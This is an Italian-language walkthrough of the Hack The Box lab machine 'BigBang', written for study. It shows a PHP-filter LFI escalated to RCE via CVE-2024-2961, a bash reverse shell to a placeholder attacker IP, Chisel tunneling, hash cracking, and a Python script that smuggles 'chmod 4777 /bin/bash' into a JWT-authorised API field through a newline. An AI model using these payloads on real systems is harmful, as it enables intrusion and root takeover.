+++
date = '2026-06-17T18:35:49+02:00'
draft = false
title = 'BigBang Writeup IT'
+++
**Nome:** **`joy.scd01`**

**Data:** **`01/02/2025`**

![BigBang.png](/images/imgs_bigbang/BigBang.jpeg)

---
# Introduzione

_BigBang_ è la terza macchina stagionale rilasciata per la **Season 7 di HTB**. Classificata come macchina **Linux di livello Hard**, presenta un percorso di attacco estremamente realistico e complesso.

Il punto di accesso iniziale richiede di concatenare una vulnerabilità **LFI** con il **PHP filtering** per ottenere **Remote Code Execution** tramite un **buffer overflow di GLIBC ICONV**. Da lì, il movimento laterale prevede la scoperta di credenziali del database, il tunneling del **servizio MySQL** con **Chisel** e il cracking di un hash estratto. 

Infine, la privilege escalation a root richiede un **port forwarding locale** per esporre un'istanza nascosta di **Grafana**, il cracking di un altro hash del database e, in ultima analisi, lo sfruttamento di un **endpoint API** vulnerabile tramite **manipolazione JWT** e **command injection**.

---
# Tecniche utilizzate

- **LFI concatenata con conversioni tramite PHP Filter**

- **RCE tramite Buffer Overflow GLIBC ICONV (CVE-2024-2961)**

- **Port Forwarding & Tunneling (Chisel & SSH)**

- **Database Dumping & Offline Password Cracking (Hashcat/John)**

- **Manipolazione JWT & Command Injection**

---
# Enumerazione

## nmap

Scansione mirata con script e rilevamento dei servizi:

```bash
nmap -sC -sV -T4 bigbang
```

![nmap.png](/images/imgs_bigbang/nmap.png)

**2 porte aperte**:
- **22/tcp** -- ssh

- **80/tcp** -- http

Notando che il **servizio HTTP** reindirizzava a un dominio specifico, ho immediatamente aggiunto **`blog.bigbang.htb`** al mio file **`/etc/hosts`** per garantire il corretto instradamento del virtual host.

---
## Enumerazione Web (gobuster & WPScan)

Ho iniziato a mappare la struttura dell'applicazione web utilizzando **gobuster**:

```bash
gobuster dir -u [http://blog.bigbang.htb](http://blog.bigbang.htb) -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

![gob.png](/images/imgs_bigbang/gob.png)

La scansione ha rivelato una classica pagina di login di **WordPress** e l'endpoint **`xmlrpc.php`**.

Sapendo di trovarmi di fronte a un sito **WordPress**, ho avviato **WPScan** per scavare più a fondo alla ricerca di potenziali vulnerabilità nei **plugin**:

```bash
wpscan --url [http://blog.bigbang.htb](http://blog.bigbang.htb) -e ap --api-token <API_TOKEN>
```

![wpscan.png](/images/imgs_bigbang/wpscan.png)

**WPScan** ha riportato diverse vulnerabilità, inclusa una nel **plugin BuddyForms**. Ho subito provato a caricare un file **PHP** malevolo per ottenere una shell rapida, ma il form accettava rigorosamente solo **immagini/GIF**.

Ho valutato l'idea di inserire codice malevolo direttamente nei metadati di un'immagine, ma non avendo mai sfruttato questa tecnica prima d'ora, ho deciso di continuare con l'enumerazione per vedere se si presentava un vettore d'attacco più pulito.

Ho quindi lanciato una seconda scansione con **gobuster** mirata alla directory **wp-content**:

```bash
gobuster dir -u [http://blog.bigbang.htb/wp-content/](http://blog.bigbang.htb/wp-content/) -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

![gob2.png](/images/imgs_bigbang/gob2.png)

All'interno della directory **`/uploads`**, ho trovato dei **file .png** che sembravano contenere **dati filtrati**. Questo è stato un enorme campanello d'allarme che puntava a una vulnerabilità di **Local File Inclusion**.

---
# Accesso Iniziale - LFI → PHP Filtering → RCE

Dopo alcune ricerche su come sfruttare questo specifico comportamento di filtraggio, ho scoperto un potenziale vettore d'attacco in questa repo **GitHub** di **ambionics**:

- https://github.com/ambionics/cnext-exploits

Con l'aiuto di un'**AI**, ho sviluppato uno script in **Python** (**lfi.py**) che sfrutta la vulnerabilità **LFI** inviando una richiesta **POST** ad **`admin-ajax.php`**. Lo script abusa del parametro url utilizzando un'enorme catena di conversioni tramite **filtri PHP** per leggere e codificare il file specificato, restituendolo infine come **.png**.

Testare lo script su **`/etc/passwd`** ha confermato la vulnerabilità:

![lfi.png](/images/imgs_bigbang/lfi.png)

## Escalation da LFI a RCE

Sebbene poter leggere i file sia fantastico, avevo bisogno di poter eseguire comandi per ottenere un foothold. Così, continuando a cercare, ho trovato un ottimo articolo che descrive in dettaglio un **buffer overflow di GLIBC ICONV in PHP** (**CVE-2024-2961**):

- https://blog.lexfo.fr/iconv-cve-2024-2961-p1.html

Ho modificato il mio script iniziale in **`bigbang_rce.py`** per leggere **`/proc/self/maps`**, estrarre gli **indirizzi di memoria** necessari e innescare l'**overflow**.

**Nota**: _Lo script completo **bigbang_rce.py** è molto esteso, ma la logica si basa sul riempimento (padding) di blocchi di memoria e sulla manipolazione della struttura **zend_mm_heap** per forzare l'**esecuzione di comandi arbitrari**._

Per eseguirlo, ho configurato un ambiente Python dedicato:

```bash
sudo apt-get update
sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
pip install ten
```

Una volta risolte le dipendenze, ho lanciato l'exploit per inviare una reverse shell al mio listener:

```bash
python3 bigbang_rce.py '[http://blog.bigbang.htb/wp-admin/admin-ajax.php](http://blog.bigbang.htb/wp-admin/admin-ajax.php)' 'bash -c "bash -i >& /dev/tcp/<attacker_ip>/<lport> 0>&1"'
```

![rce.png](/images/imgs_bigbang/rce.png)

Ottenendo la shell sulla porta 22667:

```bash
nc -lvnp 22667
```

![shell.png](/images/imgs_bigbang/shell.png)

Accesso iniziale come utente **www-data**.

---
# Movimento Laterale - DB Dump → Password Cracking

Come utente di servizio **www-data**, la mia prima mossa in qualsiasi ambiente **WordPress** è quella di leggere il file di configurazione. 

All'interno di **`wp-config.php`**, erano presenti le credenziali del database:

![dbconf.png](/images/imgs_bigbang/dbconf.png)

Per interagire comodamente con il database dalla mia macchina attaccante, avevo bisogno di raggiungere il servizio **MySQL**. Per farlo, ho effettuato un port forwarding utilizzando **Chisel**.

**Nota OPSEC**: _Ho trovato un binario **chisel** già situato nella directory **`/tmp`**, probabilmente lasciato da un altro utente. Sebbene in un ambiente come **HackTheBox** sia abbastanza improbabile che un tool del genere venga compromesso intenzionalmente da un altro player, in uno scenario reale (o in un lab condiviso) eseguire binari di terze parti sconosciuti è un grave rischio di sicurezza, in quanto potrebbero essere backdoored. La best practice assoluta è sempre quella di trasferire il binario fidato dal proprio host._

```bash
# Macchina attaccante
chisel server -p 8000 --reverse

# Macchina vittima
./chisel client <attacker_IP>:8000 R:3306:172.17.0.1:3306
```

Una volta stabilito il tunnel, mi sono connesso al **database MySQL**:

```bash
mysql -D 'wordpress' -u 'wp_user' -h 127.0.0.1 -P 3306 --skip-ssl -p --connect-timeout=5 -v
```

![database.png](/images/imgs_bigbang/database.png)

All'interno del database ho trovato l'**hash** per l'utente **shawking**. L'ho salvato in locale e ho avviato **John The Ripper**:

```bash
john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![hash.png](/images/imgs_bigbang/hash.png)

Mi sono loggato tramite **SSH** e ho recuperato la **user flag**:

![userF.png](/images/imgs_bigbang/userF.png)

---
# Privilege Escalation – Tunneling → JWT Injection → Root

Una volta loggato come **shawking**, ho caricato ed eseguito **`linpeas.sh`** per cercare vettori di privilege escalation. L'output ha evidenziato diverse informazioni critiche:

- Un servizio interno in esecuzione su **127.0.0.1:9090**.

- Un utente aggiuntivo chiamato **developer**.

- Un file **`/.htpasswd`** contenente **hash**.

- Un altro **database SQLite** appartenente a **Grafana**.

![grafagna.png](/images/imgs_bigbang/grafagna.png)

## Porta 9090 & Grafana

Per raggiungere il servizio sulla **porta 9090**, ho impostato un **port forwarding locale** via **SSH**:

```bash
ssh -L 9090:127.0.0.1:9090 shawking@bigbang.htb
```

Contemporaneamente, ho estratto l'**hash** da **grafana.db** e l'ho craccato utilizzando **Hashcat**, ottenendo la password: **bigbang**.

Ho testato l'invio di una rapida **richiesta POST** per bruteforzare l'endpoint **`/login`** sulla porta inoltrata utilizzando le credenziali scoperte:

```bash
curl -X POST -v 127.0.0.1:9090/login \
-H "Content-Type: application/json" \
-d '{"username":"developer","password":"bigbang"}'
```

Questo ha restituito con successo un **Token JWT**.

![jwt.png](/images/imgs_bigbang/jwt.png)

Utilizzando la password craccata, sono anche riuscito a collegarmi via **SSH** come utente **developer**. Tuttavia, quasi ogni comando restituiva un errore di "**Permission Denied**". Il mio accesso era pesantemente limitato.

## Command Injection tramite JWT

Avevo un **token JWT** e una shell limitata. Ho fatto delle ricerche sulla versione specifica dell'applicazione e ho scoperto che il suo endpoint API **`/command`** era vulnerabile ad una **command injection** attraverso il parametro **output_file**, abusando del carattere: a capo (**\n**).

Ho scritto un piccolo script in **Python** per automatizzare l'injection utilizzando il **token JWT** ottenuto per l'autorizzazione:

```python
import requests

url = "[http://127.0.0.1:9090/command](http://127.0.0.1:9090/command)"

headers = {
    "Host": "127.0.0.1:9090",
    "User-Agent": "curl/8.10.1",
    "Accept": "*/*",
    "Content-Type": "application/json",
    "Authorization": "Bearer <INSERISCI_QUI_IL_TOKEN_JWT>"
}

payload = {
    "command": "send_image",
    "output_file": "foo \n chmod 4777 /bin/bash"
}

response = requests.post(url, headers=headers, json=payload)

print("Status Code:", response.status_code)
print("Response Body:", response.text)
```

Eseguendo **`chmod 4777 /bin/bash`**, ho assegnato con successo il **SUID bit** al binario **bash**.

Tornando alla mia sessione **SSH**, ho chiamato una shell privilegiata:

```bash
/bin/bash -p
```

![root.png](/images/imgs_bigbang/root.png)

**Box rootato**.

---
# Conclusioni Finali

BigBang rappresenta un traguardo speciale per me, essendo la mia primissima macchina di livello **Hard** completata da attiva in solitaria su **HackTheBox**.

La transizione da una LFI apparentemente semplice allo sfruttamento di un buffer overflow in GLIBC tramite catene di PHP filter è un vettore altamente tecnico. 
Oltre alla pura fase di exploitation, questa macchina è stata incredibilmente utile per mettere le mani in pasta con lo scripting in Python. Adattare, debuggare e comprendere gli script personalizzati per l'LFI e il buffer overflow, anche con l'aiuto di un'AI, ha fornito un'enorme opportunità di apprendimento.

Il movimento laterale è stato lineare ma ha richiesto un approccio metodico al port forwarding, sottolineando l'importanza di strumenti come Chisel. Infine, l'escalation dei privilegi ha dimostrato i pericoli degli endpoint API non sicuri e della mancata sanitizzazione degli input negli strumenti interni.

Nel complesso, una macchina intensa e altamente gratificante che mette alla prova l'exploitation web avanzata, lo scripting personalizzato e le capacità di pivoting interno.

**Fonti**:

- **CNEXT Exploits (LFI)**: https://github.com/ambionics/cnext-exploits

- **Buffer Overflow GLIBC ICONV (CVE-2024-2961)**: https://blog.lexfo.fr/iconv-cve-2024-2961-p1.html